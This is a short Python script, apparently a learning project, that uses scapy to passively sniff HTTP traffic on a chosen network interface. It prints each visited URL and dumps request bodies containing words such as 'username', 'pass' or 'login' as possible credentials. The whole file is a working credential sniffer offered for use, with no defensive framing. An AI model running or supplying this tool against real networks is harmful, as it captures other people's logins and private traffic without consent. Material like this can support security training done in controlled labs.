#! /home/paulomesquita/.pyenv/shims/python

from struct import pack
import scapy.all as scapy
from scapy.layers import http
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Network interface")
    options = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify a interface, use --help for more info")
    return options



def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_package)
    
def process_package(package):
    if package.haslayer(http.HTTPRequest):
        print("[+] Url visited: {}{}".format(package[http.HTTPRequest].Host.decode(),package[http.HTTPRequest].Path.decode()))
        if package.haslayer(scapy.Raw):
            load = package[scapy.Raw].load
            keywords = ["username", "uname", "name", "pass", "password", "login", "email", "e-mail", "e_mail"]
            for keyword in keywords:
                if keyword.encode() in load:
                    print("[*] Possible username and password: {}".format(package[scapy.Raw].load.decode()))
                    break

options = get_arguments()
sniff(options.interface)